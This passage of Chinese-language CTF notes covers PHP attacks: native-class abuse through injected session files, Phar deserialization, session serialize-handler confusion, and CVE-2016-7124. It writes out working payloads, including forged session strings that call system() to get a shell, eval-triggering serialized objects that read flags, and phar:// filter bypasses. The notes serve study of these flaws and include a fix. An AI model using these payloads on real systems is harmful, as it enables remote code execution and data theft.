header(&#x27;Location:/?file=&#x27;.$filename);&#125;\n这里把文件的名字和路径都存到了SESSION里面，但是我们能够看到$_SESSION['paths'][$filepath]的值是被写死了，我们无法控制，然后接着往下看\n$filelist = array();foreach ($_SESSION[&#x27;paths&#x27;] as $path=&gt;$class)&#123;          // 将每一个文件的路径赋值给$path,将&#x27;file&#x27;赋值给$class    $temp = new $class($path);          // 相当于new file(文件的路径)    if($class==&#x27;file&#x27;)&#123;             // 存在$class不等于file的情况吗？？？？        $filelist[] = (string)$temp;    //将返回的文件名赋值给列表    &#125;    else&#123;        $filelist[] = $temp;    &#125;&#125;$out = &#x27;&lt;p&gt;your file:&#x27;; foreach ($filelist as $value)&#123;    $out .= $value.&#x27; &#x27;;         //从列表中读取输出文件名&#125;echo $out.&#x27;&lt;/p&gt;&#x27;;\n我们可以看到，这里从$_SESSION['paths']数组里面把每一个键（文件的路径）赋值给$path,将值'file'赋值给$class，然后重点就来了，这里用动态调用的方法新建了一个类对象，看到这里是不是觉得很奇怪，在上一段代码中，已经把每一个$_SESSION['paths']的值已经写死了为'file'了，为什么这里要动态调用而不是直接new file($path)这种更直接的方式呢，这里很明显有问题。接着往下看，这里又用if()来判断$class的值是否是'file'，这就更加明显了了，$class的值必然又猫腻，看回代码，最后是将新建的类对象赋值给一个临时变量，然后再通过循环输出每一个值，看到这里是不是有点熟悉，这不就是SplFileObject类需要循环来输出每一行的值吗？于是这里几乎能肯定是通过将$class的值变成SplFileObject，来获取文件的内容。\n既然是读取SESSION的内容，那我是否能够改变SESSION的内容呢？结合我们目录穿越的漏洞，实际上如果我们知道SESSION保存的路径和SESSION序列化的方法，那么我们实际上可以直接上传一个SESSION文件到指定的目录中，控制SESSION的内容，所以最后一个info.php文件就是让我们看SESSION保存的路径和序列化方法的。\n\n接着就是构造我们的SESSION序列化后的文件\npaths|a:1:&#123;s:5:&quot;/flag&quot;;s:13:&quot;SplFileObject&quot;;&#125;\n这里的键为/flag对应代码中的$path，值为SplFileObject对应$class，组合起来就是SplFileObject('/flag')。然后文件名需要目录穿越到/tmp/sess_[SSID的值]\n\nfunc是一个变量，并未赋值，files变量有一个数组，其中键值filename对应./files/filename，后面的paths同理\n这里懵逼了半天，我以为作者想靠PHP序列化引擎反序列化输入的content，弄半天只是将内容插入session文件中，这样由于他是php序列化引擎，将|看做键值分隔符，这样就path做为key，后面是值，那这一切就说通了…，与我所见不同的是，他这已经是目录穿越进入到session文件中了，因此他post写的内容就直接插入session文件，并不会被序列化处理（嗯，大概是这样吧）\nReflectionFunction反射类\n这里是另外一个能利用的类，这个类能够直接写shell，比上面的只能读文件更加牛逼。这也应该是预期解，题目中所有的代码都用上了。\n网上能够搜出来CTF中的用法是：\n&lt;?php    $func = new ReflectionFunction($_GET[m]);    echo $func-&gt;invokeArgs(array($_GET[c]));?&gt;\n\n那这道题里面该怎么用这个类呢，由于要用到这个类里面的invokeArgs()这方法，因此要用到数组去动态调用类里面的方法。\nexample：\nclass Test&#123;    public function hello($name)    &#123;        echo &quot;hello &quot;.$name;    &#125;&#125;$t = new Test();$a = array(0 =&gt; $t,1 =&gt; &quot;hello&quot;);$a(&#x27;john&#x27;);            // 输出hello john\n这里用数组的第一个位置的值是实例化后的类，第二个位置的值是类的方法名，因此我们要的是：\n$function = new ReflectionFunction(&#x27;system&#x27;);$a = array(0 =&gt; $function,1 =&gt; &quot;invokeArgs&quot;);$b = array(0 =&gt; &#x27;whoami&#x27;);$a($b);\n先实例化ReflectionFunction类对象，然后再构造出这两个数组，最后找到一个能够动态调用的地方。\n再看回题目，我们在之前的分析中已经能实现能够实例化自己想要的类了。\npaths|a:1:&#123;s::&quot;system&quot;;s::&quot;ReflectionFunction&quot;;&#125;\n那怎么构造出第一个数组呢，再看回这段代码：\n$filelist = array();foreach ($_SESSION[&#x27;paths&#x27;] as $path=&gt;$class)&#123;          // 将每一个文件的路径赋值给$path,将&#x27;file&#x27;赋值给$class    $temp = new $class($path);          // 相当于new file(文件的路径)    if($class==&#x27;file&#x27;)&#123;             // 存在$class不等于file的情况吗？？？？        $filelist[] = (string)$temp;    //将返回的文件名赋值给列表    &#125;    else&#123;        $filelist[] = $temp;    &#125;&#125;\n这里已经为我们准备好了一个$filelist数组，在构造ReflectionFunction类对象的时候由于$class不等于字符串'file'，因此是直接放进了数组中，然后数组第二位我们需要是'invokeArgs'这个字符串，因此我们可以让$class='file'同时让$path='invokeArgs'，这样就能够返回一串字符串添加进数组里面，从而完成第一个数组的构造！\npaths|a:2:&#123;s:6:&quot;system&quot;;s:18:&quot;ReflectionFunction&quot;;s:10:&quot;invokeArgs&quot;;s:4:&quot;file&quot;;&#125;\n得到$filelist = array(0 =&gt; $temp,1 =&gt; &quot;invokeArgs&quot;);\n接下来就是构造第二个数组，和动态调用类方法。\nif(isset($_GET[&#x27;file&#x27;]))&#123;    if(isset($_SESSION[&#x27;files&#x27;][$_GET[&#x27;file&#x27;]])) &#123;      //GET方法读取文件名，从session的文件名字里面寻找        $pathinfo = array($_GET[&#x27;file&#x27;]=&gt;$_SESSION[&#x27;files&#x27;][$_GET[&#x27;file&#x27;]]);        // 构造数组        $&#123;$_SESSION[&#x27;func&#x27;]&#125;($pathinfo);    // 动态调用！！    &#125;    else&#123;        echo &#x27;no such file!&#x27;;    &#125;&#125;\n可以看到$pathinfo这里为我们构造了一个数组，并且数组的键是从GET方法获取的，而值又是从SESSION中的files数组里面找的，因此我们同样能够控制。\nfiles|a:1:&#123;i:0;s:6:&quot;whoami&quot;;&#125;\n当使用GET方法去传递file=0这个参数的时候就能够构造出$pathinfo = array(0=&gt;'whoami')。\n最后是动态调用，这里同样是从SESSION中的func参数中获取值进行动态调用，因此我们只需构造$_SESSION['func']='filelist'即可\nfunc|s:8:&quot;filelist&quot;\n综上所述，我们写进SESSION文件里面的内容是\nfunc|s:8:&quot;filelist&quot;;files|a:1:&#123;i:0;s:6:&quot;whoami&quot;;&#125;paths|a:2:&#123;s:6:&quot;system&quot;;s:18:&quot;ReflectionFunction&quot;;s:10:&quot;invokeArgs&quot;;s:4:&quot;file&quot;;&#125;\n\n这样就能够getshell了。\n修复\n修就很简单了，既然是因为目录穿越导致能够控制SESSION的内容，那么修掉目录穿越的地方就好了：\nif(isset($_POST[&#x27;filename&#x27;])&amp;&amp;isset($_POST[&#x27;content&#x27;]))&#123;    if(stristr($_POST[&#x27;filename&#x27;], &#x27;h&#x27;))&#123;                    die(&#x27;no h!&#x27;);    &#125;    $filename = basename($_POST[&#x27;filename&#x27;]);    $filepath = &#x27;./files/&#x27;.$filename;    //去掉了post，导致不可控，也就不能穿越了      file_put_contents($filepath,$_POST[&#x27;content&#x27;]);?&gt;\n参考：https://johnfrod.top/安全/ctf-中-php原生类的利用/\n0x11 Phar反序列化\nctfshow 276\nphar文件本质上是一种压缩文件，会以序列化的形式存储用户自定义的meta-data。当受影响的文件操\n作函数调用phar文件时，会自动反序列化meta-data内的内容。\n11.1 什么是phar文件\n在软件中，PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，\n样式表等）捆绑到一个归档文件中来实现应用程序和库的分发\nphp通过用户定义和内置的“流包装器”实现复杂的文件处理功能。内置包装器可用于文件系统函数，如\n(fopen(),copy(),file_exists()和filesize()。 phar://就是一种内置的流包装器。\nphp中一些常见的流包装器如下：\nfile:// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流\n11.2 phar文件的结构\n1.stub格式为：xxx&lt;?php xxx; __HALT_COMPILER();?&gt;前面内容不限，但必须以__HALT_COMPILER();?&gt;来结尾，这部分的目的就是让 phar 扩展识别这是一个标准的 phar 文件phar文件标志，必须包含&lt;?php __HALT_COMPILER(); ?&gt;,PHP结束标志?&gt;可以省略，但语句结束符;与stub的结尾之间不能超过两个空格。在生成phar之前应先添加stub.&lt;?php __HALT_COMPILER(); ?&gt;之前也可添加其他内容伪造成其他文件，比如GIF89a&lt;?php __HALT_COMPILER(); ?&gt;manifest:phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用最核心的地方。content:这部分就是我们想要压缩在 phar 压缩包内部的文件signature (可空):签名，放在末尾。\nmanifest 存放phar归档信息.Manifest结构如下图 所有未使用的标志保留，供将来使用，并且不得用于存储自定义信息。使用每个文件的元数据功能来存储有关特定文件的自定义信息.\n\n下面生成一个phar文件\n前提：开启php.ini中的 phar.readonly = off\n&lt;?php    class Test &#123;    &#125;    @unlink(&quot;phar.phar&quot;);    $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar    $phar-&gt;startBuffering();    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub    $o = new Test();    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件    //签名自动计算    $phar-&gt;stopBuffering();?&gt;\n11.3 漏洞利用条件\n\nphar文件要能够上传到服务器端。\n要有可用的魔术方法作为“跳板”。\n文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。\n\n11.4 受影响的函数：\nhttps://blog.zsxsoft.com/post/38\nphp中的大部分与文件操作相关函数在通过phar协议获取数据时会将phar文件的meta-data部分反序列化\n\n\n\n受影响的函数列表\n\n\n\n\n\n\n\nfileatime\nfilectime\nfile_exists\nfile_get_contents\n\n\nfile_put_contents\nfile\nfilegroup\nfopen\n\n\nfileinode\nfilemtime\nfileowner\nfikeperms\n\n\nis_dir\nis_executable\nis_file\nis_link\n\n\nis_readable\nis_writable\nis_writeable\nparse_ini_file\n\n\ncopy\nunlink\nstat\nreadfile\n\n\n\n11.5 绕过方式\n当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2://和compress.zlib://等绕过\ncompress.bzip://phar:///test.phar/test.txtcompress.bzip2://phar:///test.phar/test.txtcompress.zlib://phar:///home/sx/test.phar/test.txtphp://filter/resource=phar:///test.phar/test.txt\n当环境限制了phar不能出现在前面的字符里，还可以配合其他协议进行利用。\nphp://filter/read=convert.base64-encode/resource=phar://phar.phar\nGIF格式验证可以通过在文件头部添加GIF89a绕过\n1、$phar-&gt;setStub(“GIF89a”.“”); //设置stub\n2、生成一个phar.phar，修改后缀名为phar.g\n实战参考：https://xz.aliyun.com/t/6699#toc-4\n11.6 从 PHP 源码探索 phar 利用成功的深层原因\n1. PHP 流的概念\n流的作用是在出发地和目的地之间传输数据。出发地和目的地可以是文件、命令行进程、网络连接、ZIP 或 TAR 压缩文件、临时内存、标准输入或输出，或者是通过 PHP 流封装协议实现的任何其他资源。\n如果你读写过文件，就用过流；如果你从 php://stdin 读取过数据，或者把输入写入 php://stdout，也用过流。流为 PHP 的很多 IO 函数提供了底层实现，如 file_get_contents、fopn、fread 和 fwrite 等。PHP 的流函数提供了不同资源的统一接口。\n我们可以把流比作管道，把水（资源数据）从一个地方引到另一个地方。在水从出发地到目的地的过程中，我们可以过滤水，可以改变水质，可以添加水，也可以排出水。\n2. 流封装协议（wrapper）\n因为流式数据的种类各异，而每种类型需要独特的协议，以便读写数据，我们称这些协议为流封装协议。例如，我们可以读写文件系统，可以通过 HTTP、HTTPS 或 SSH 与远程 Web 服务器通信，还可以打开并读写 ZIP、RAR 或 PHAR 压缩文件\n虽然过程是一样的，但是读写文件系统中文件的方式与收发 HTTP 消息的方式有所不同，流封装协议的作用是使用通用的接口封装这种差异。\n每个流都有一个协议和一个目标。指定协议和目标的方法是使用流标识符：&lt;scheme&gt;://&lt;target&gt;，其中 &lt;scheme&gt; 是流的封装协议，&lt;target&gt; 是流的数据源。\n2.1 http://流封装协议\n下面使用 HTTP 流封装协议创建了一个与 Flicker API 通信的 PHP 流：\n&lt;?php$json = file_get_contents(    &#x27;http://api.flickr.com/services/feeds/photos_public.gne?format=json&#x27;);\n不要以为这是普通的网页 URL，file_get_contents() 函数的字符串参数其实是一个流标识符。http 协议会让 PHP 使用 HTTP 流封装协议，在这个参数中，http 之后是流的目标。\n\n注：很多 PHP 开发者可能并不知道普通的 URL 其实是 PHP 流封装协议标识符的伪装。\n\n2.2 file://流封装协议\n我们通常使用 file_get_contents()、fopen()、fwrite() 和 fclose() 等函数读写文件系统，因为 PHP 默认使用的流封装协议是 file://，所以我们很少认为这些函数使用的是 PHP 流。下面的示例演示了使用 file:// 流封装协议创建一个读写 /etc/hosts 文件的流：\n&lt;?php$handle = fopen(&#x27;file:///etc/hosts&#x27;, &#x27;rb&#x27;);while (feof($handle) !== TRUE) &#123;        echo fgets($handle);&#125;fclose($handle);\n我们通常会省略掉 file:// 协议，因为这是 PHP 使用的默认值。\n这两段介绍来源于https://laravelacademy.org/post/7459.html，那么这个说明了一个什么问题呢？说明我们PHP 目前的几乎所有的 I/O 操作都是通过流配合流包装器来实现的，因为 PHP 默认的包装器就是 file:// ，虽然你没写，但是底层 PHP 还是通过流包装器实现的。\n还有更多\n使用 stream_get_wrappers() 获取当前系统注册的全部 wrapper\n\n3. 开始向下挖掘\n我们上面说了，phar 文件中存在我们可控的序列化的内容，然后我们又说，这个内容在 文件系统函数 配合 phar:// 的时候能实现反序列化，但是我们没说为什么，这也就是我们这节讨论的重点，所有的原因都能从源代码找到答案\n(1)先看一下 Phar 文件源代码部分\n因为 Phar 是 PHP 的一个扩展，于是我们在 GitHub 的 php-src/ext/phar/phar.c 去全局搜索 unserailize() 函数\n如图所示：\n\n(2)但是这个函数为什么能调用呢\n这就涉及到了文件系统函数的部分了，我们找一下源码，位置在 Github php-src/ext/standard/file.c\n这个文件包含了非常多的文件函数的实现，我们先全局搜索 file_get_contents\n如图所示：\n\n然后我们稍微往下翻翻就能发现和处理 wrapper 流相关的函数\n如图所示：\n\n我们发现了这个 php)stream_open_wrapper_ex 这个函数能处理我们的 wrapper ，那么其他的类似的函数是不是也是底层调用了这个函数呢？\n(3)由此及彼\n我们全局搜索一下 fopen()，然后我们看一下具体的实现\n如图所示：\n\n是不是很熟悉？这下好了，我们不如把 PHP 源码下载下来，来一个真正的全局搜索\n(4)举一反三\n我本地使用 sublime text 对整个 PHP 源码进行了扫描，发现了很多很多地方调用了这个函数，其实并不只是我们常见的 文件系统函数\n如图所示：\n\n好家伙，太底层了，看不懂了，日后拜读\n参考：https://www.k0rz3n.com/2018/11/19/一篇文章带你深入理解PHP反序列化漏洞/#4-phar-的实战\n0x12 php-session反序列化\n12.1 session简单介绍\n​\t\t在计算机中，尤其是在网络应用中，称为“会话控制”。Session 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的 Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 Web 页时，如果该用户还没有会话，则 Web 服务器将自动创建一个 Session 对象。当会话过期或被放弃后，服务器将终止该会话。当第一次访问网站时，**seesion_start()**函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。\n官方Session定义：在计算机中，尤其是在网络应用中，称为“会话控制”。Session对象存储特定用户会话所需的属性及配置信息。主要有以下特点：session保存的位置是在服务器端session通常是要配合cookie使用因为HTTP的无状态性，服务端产生了session来标识当前的用户状态本质上，session就是一种可以维持服务器端的数据存储技术。即**session技术就是一种基于后端有别于数据库的临时存储数据的技术**\n12.2 session 的存储机制\nphp中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项\nsession.save_handler来进行确定的，默认是以文件的方式存储。存储的文件是以sess_sessionid来进行命名的\nsession_start();运行之后开启session并且产生一个唯一的32位的session_id\n12.3 session文件创建的几个tip\n1.代码中有session_start(),会自动创建session文件。\n2.如果session.auto_start=On ，则PHP在接收请求的时候会自动初始化Session（也就创建了session文件），不再需要执行session_start()。但默认情况下，这个选项都是关闭的。\n3.session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。\n比如，我们在Cookie里设置PHPSESSID=TGAO，PHP将会在服务器上创建一个文件：/tmp/sess_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(&quot;session.upload_progress.prefix&quot;)+由我们构造的session.upload_progress.name值组成，最后被写入session文件里。 \n注意：如果默认配置session.upload_progress.cleanup = on导致文件上传后，session文件内容立即清空。这时我们就要利用竞争，在session文件内容清空前进行包含利用。\n12.4 PHP session工作流程\n以PHP为例，理解session的原理\n1. PHP脚本使用 session_start()时开启`session`会话，会自动检测`PHPSESSID`   - 如果`Cookie`中存在，获取`PHPSESSID`   - 如果`Cookie`中不存在，创建一个`PHPSESSID`，并通过响应头以`Cookie`形式保存到浏览器   2. 初始化超全局变量`$_SESSION`为一个空数组3. PHP通过`PHPSESSID`去指定位置（`PHPSESSID`文件存储位置）匹配对应的文件   - 存在该文件：读取文件内容（通过反序列化方式），将数据存储到`$_SESSION`中   - 不存在该文件： session_start()创建一个`PHPSESSID`命名文件   4. 程序执行结束，将`$_SESSION`中保存的所有数据序列化存储到`PHPSESSID`对应的文件中\n具体原理图：\n\n12.5 php.ini中一些session配置\nsession.save_handler=“”\t\t–设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)\nsession.auto_start boolen\t–指定会话模块是否在请求开始时启动一个会话默认为0不启动\nsession.save_path=&quot;/tmp&quot;      --设置session文件的存储位置\nsession.auto_start= 0          --指定会话模块是否在请求开始时启动一个会话，默认值为 0，不启动\nsession.serialize_handler= php --定义用来序列化/反序列化的处理器名字，默认使用php  \nsession.upload_progress.enabled= On --启用上传进度跟踪，并填充$ _SESSION变量，默认启用\nsession.upload_progress.cleanup= On --读取所有POST数据（即完成上传）后立即清理进度信息，默认启用\n\n12.6 不同的引擎来处理session文件\n1. php处理器\n首先来看看默认session.serialize_handler = php时候的序列化结果，代码如下\n&lt;?phperror_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);session_start();$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];?&gt;\n\nphp处理器存储格式\n\n\n\n键名\n竖线\n经过 serialize() 函数反序列处理的值\n\n\n\n\n$_SESSION[‘name’]的键名：name\n|\ns:7:“xianzhi”;\n\n\n\n2. php_binary处理器\n使用php_binary处理器，即session.serialize_handler = php_binary\n&lt;?phperror_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_binary&#x27;);session_start();$_SESSION[&#x27;sessionsessionsessionsessionsession&#x27;] = $_GET[&#x27;session&#x27;];?&gt;\n为了更能直观的体现出格式的差别，因此这里设置了键值长度为 35，35 对应的 ASCII 码为#，所以最终的结果如下图所示：\n\n\n\n\n键名的长度对应的 ASCII 字符\n键名\n经过 serialize() 函数反序列处理的值.\n\n\n\n\n$\nsessionsessionsessionsessionsession\ns:7:“xianzhi”;\n\n\n\n3. php_serialize 处理器\n使用php_binary处理器，即session.serialize_handler = php_serialize\n&lt;?phperror_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);session_start();$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];?&gt;\n\n序列化的结果为：a:1:&#123;s:7:&quot;session&quot;;s:7:&quot;xianzhi&quot;;&#125;\na:1表示$_SESSION数组中有 1 个元素，花括号里面的内容即为传入 GET 参数经过序列化后的值\n4. session的反序列化漏洞利用\nsession的反序列化漏洞，就是利用php处理器和php_serialize处理器的存储格式差异而产生，通过具体的代码我们来看下漏洞出现的原因\nphp引擎的存储格式是键名|serialized_string，而php_serialize引擎的存储格式是serialized_string。如果程序使用两个引擎来分别处理的话就会出现问题\n&lt;?phpsession_start();$_SESSION[&#x27;aaa&#x27;] = &#x27;bbb&#x27;;//aaa|s:3:&quot;bbb&quot;;//该引擎使用的是php，会把&#x27;|&#x27;看做键名与值的分割符，从而造成了歧义，导致其在解析session文件时直接对&#x27;|&#x27;后的值进行反序列化处理。\n&lt;?phpini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);session_start();$_SESSION[&#x27;aaa&#x27;] = &#x27;bbb&#x27;;//a:1:&#123;s:3:&quot;aaa&quot;;s:3:&quot;bbb&quot;;&#125;//php_serialize引擎只会把&#x27;|&#x27;当做一个正常的字符。\n具体示例分析：\n首先创建session.php，使用php_serialize处理器来存储session数据\n&lt;?phpini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);session_start();$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];echo $_SESSION[&#x27;session&#x27;];?&gt;\ntest.php，使用默认php处理器来存储session数据\n&lt;?phpsession_start();class f4ke&#123;    public $name;    function __wakeup()&#123;      echo &quot;Who are you?&quot;;    &#125;    function __destruct()&#123;      eval($this-&gt;name);    &#125;&#125;$str = new f4ke();?&gt;\n接着，我们构建URL进行访问session.php：\nhttp://www.session-serialize.com/session.php?session=|O:4:&quot;f4ke&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;&#125;\n\n打开PHPSESSID文件可看到序列化存储的内容\na:1:&#123;s:7:&quot;session&quot;;s:45:&quot;|O:4:&quot;f4ke&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;&#125;\n\n漏洞分析：\n\n在session.php程序执行，我们将|O:4:&quot;f4ke&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;&#125;通过php_serialize处理器序列化保存成PHPSESSID文件；\n由于浏览器中保存的PHPSESSID文件名不变，当我们访问test.php，session_start();找到PHPSESSID文件并使用php处理器反序列化文件内容，识别格式即\n\n\n\n键名\n竖线\n经过 serialize() 函数反序列处理的值\n\n\n\n\na:1:{s:7:“session”;s:45:&quot;\n|\nO:4:“f4ke”:1:{s:4:“name”;s:10:“phpinfo();”;}\n\n\n\nphp处理器会以|作为分隔符，将O:4:&quot;f4ke&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;&#125;反序列化，就会触发__wakeup()方法，最后对象销毁执行__destruct()方法中的eval()函数，相当于执行如下：\n$_SESSION[&#x27;session&#x27;] = new f4ke();$_SESSION[&#x27;session&#x27;]-&gt;name = &#x27;phpinfo();&#x27;;\n\n我们访问test.php，即可直接执行phpinfo()函数\n\nCTF例题：PHPINFO\n找不到原题，先跟着做一遍\n&lt;?php//A webshell is wait for youini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);session_start();class OowoO&#123;    public $mdzz;    function __construct()    &#123;        $this-&gt;mdzz = &#x27;phpinfo();&#x27;;    &#125;        function __destruct()    &#123;        eval($this-&gt;mdzz);    &#125;&#125;if(isset($_GET[&#x27;phpinfo&#x27;]))&#123;    $m = new OowoO();&#125;else&#123;    highlight_string(file_get_contents(&#x27;index.php&#x27;));&#125;?&gt;\n我们可以看到ini_set('session.serialize_handler', 'php')，判断可能存在session反序列化漏洞，根据代码逻辑，访问URL加上phpinfo参数新建对象触发魔术方法执行phpinfo()函数，进一步查看session.serialize_handler配置\n\n可见php.ini中session.serialize_handler = php_serialize，当前目录中被设置为session.serialize_handler = php，因此存在session反序列化利用的条件\n补充知识\nphpinfo文件中local value(局部变量：作用于当前目录程序，会覆盖master value内容):phpmaster value(主变量：php.ini里面的内容):php_serialize\n那么我们如何找到代码入口将利用代码写入到session文件？想要写入session文件就得想办法在$_SESSION变量中增加我们可控的输入点\n补充知识\nSession 上传进度(此特性自 PHP 5.4.0 后可用)当 session.upload_progress.enabledINI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时可以发送一个POST请求到终端（例如通过XHR）来检查这个状态当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix与 session.upload_progress.name连接在一起的值。\n翻译成人话就是，当检测Session 上传进度这一特性是开启状态时，我们可以在客户端写一个文件上传的功能，文件上传的同时，POST一个与php.ini中设置的session.upload_progress.name同名变量PHP_SESSION_UPLOAD_PROGRESS，如下图，即可写入$_SESSION，进一步序列化写入session文件\n\n下面是官方给出的一个文件上传时监测进度例子:\n&lt;form action=&quot;upload.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;&lt;?php echo ini_get(&quot;session.upload_progress.name&quot;); ?&gt;&quot; value=&quot;123&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file1&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file2&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt;\n其中name=&quot;&quot;也可以设置为name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;\n在session中存储的上传进度，如下所示:\n&lt;?php$_SESSION[&quot;upload_progress_123&quot;] = array( &quot;start_time&quot; =&gt; 1234567890,   // The request time  请求时间 &quot;content_length&quot; =&gt; 57343257, // POST content length 长度 &quot;bytes_processed&quot; =&gt; 453489,  // Amount of bytes received and processed 已接收字节 &quot;done&quot; =&gt; false,              // true when the POST handler has finished, successfully or not 是否上传完成 &quot;files&quot; =&gt; array(//上传的文件  0 =&gt; array(   &quot;field_name&quot; =&gt; &quot;file1&quot;,       // Name of the &lt;input/&gt; field  input中设定的变量名   // The following 3 elements equals those in $_FILES                &quot;name&quot; =&gt; &quot;foo.avi&quot;,           //文件名   &quot;tmp_name&quot; =&gt; &quot;/tmp/phpxxxxxx&quot;,   &quot;error&quot; =&gt; 0,   &quot;done&quot; =&gt; true,                // True when the POST handler has finished handling this file   &quot;start_time&quot; =&gt; 1234567890,    // When this file has started to be processed   &quot;bytes_processed&quot; =&gt; 57343250, // Amount of bytes received and processed for this file  ),  // An other file, not finished uploading, in the same request  1 =&gt; array(   &quot;field_name&quot; =&gt; &quot;file2&quot;,   &quot;name&quot; =&gt; &quot;bar.avi&quot;,   &quot;tmp_name&quot; =&gt; NULL,   &quot;error&quot; =&gt; 0,   &quot;done&quot; =&gt; false,   &quot;start_time&quot; =&gt; 1234567899,   &quot;bytes_processed&quot; =&gt; 54554,  ), ));\n其中，session中的field_name和name都是我们可控的输入点！\n下面我们就开始解题拿到flag\n首先，http://web.jarvisoj.com:32784/index.php?phpinfo查询设置\n\nsession.upload_progress.enabled = On   --表明允许上传进度跟踪，并填充$ _SESSION变量session.upload_progress.cleanup = Off  --表明所有POST数据（即完成上传）后，不清理进度信息($ _SESSION变量)\n即允许上传进度跟踪且结束后不清除数据，更有利使用session.upload_progress.name来将利用代码写入session文件\n构造POST表单提交上传文件\n&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt;\n构造序列化字符串作为payload（利用代码）\n&lt;?phpclass OowoO&#123;    public $mdzz=&#x27;print_r(scandir(dirname(__FILE__)));&#x27;;&#125;$obj = new OowoO();echo serialize($obj);?&gt;//O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;&#125;\n为了防止&quot;被转义，我们在payload中加入\\\n随意选择文件，点击表单提交，使用抓包工具burpsuite抓取请求包\n\n并修改filename值为\n|O:5:\\&quot;OowoO\\&quot;:1:&#123;s:4:\\&quot;mdzz\\&quot;;s:36:\\&quot;print_r(scandir(dirname(__FILE__)));\\&quot;;&#125;\n发送请求包，代码执行过程分析：\n\n因此直接执行print_r(scandir(dirname(__FILE__)));并返回\n\nphpinfo`查看当前目录，`/opt/lampp/htdocs/\n\n构造最终payload读取Here_1s_7he_fl4g_buT_You_Cannot_see.php文件内容，即flag\n|O:5:\\&quot;OowoO\\&quot;:1:&#123;s:4:\\&quot;mdzz\\&quot;;s:88:\\&quot;print_r(file_get_contents(\\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\\&quot;));\\&quot;;&#125;\n\n这里不知道为啥访问不了连接，找到了原靶场也不行…\nctfshow web263\nsession.upload_progress进行文件包含和反序列化渗透\nhttps://www.freebuf.com/vuls/202819.ht\n12.7 CVE-2016-7124\n漏洞分析\n该漏洞存在于PHP5小于5.6.25版本或PHP7小于7.0.10版本中，该漏洞简单来说就是当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup()的执行，demo如下\n&lt;html&gt;&lt;head&gt;&lt;title&gt;PHP反序列化demo&lt;/title&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;?phpclass test&#123;    var $name = &quot;Jacky&quot;;    function __destruct()&#123;        $file = fopen(&quot;hello.php&quot;,&quot;w&quot;);        fputs($file,$this-&gt;name);        fclose($file);    &#125;    function __wakeup()        &#123;            